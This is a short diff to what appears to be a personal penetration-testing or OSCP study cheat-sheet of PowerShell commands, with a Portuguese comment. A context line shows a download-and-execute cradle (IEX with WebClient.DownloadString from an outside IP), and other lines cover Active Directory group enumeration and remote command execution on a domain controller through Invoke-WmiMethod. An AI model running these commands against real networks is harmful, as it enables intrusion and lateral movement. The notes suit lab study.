@@ -3546,3 +3546,7 @@ IEX(New-Object System.Net.WebClient).DownloadString("http://175.12.80.10/oscp/cr
 $FormatEnumerationLimit=-1
 Get-netgroup | Get-NetGroupMember -domain trusted.corp | select GroupName,MemberName | Out-String -Width 4096
 ```
+WMIC FUNFANDO? TESTAR NO DC
+```
+Invoke-WmiMethod win32_process -ComputerName dcorp-dc -name create -argumentlist "cmd.exe /c whoami >> c:\teste.txt"
+```
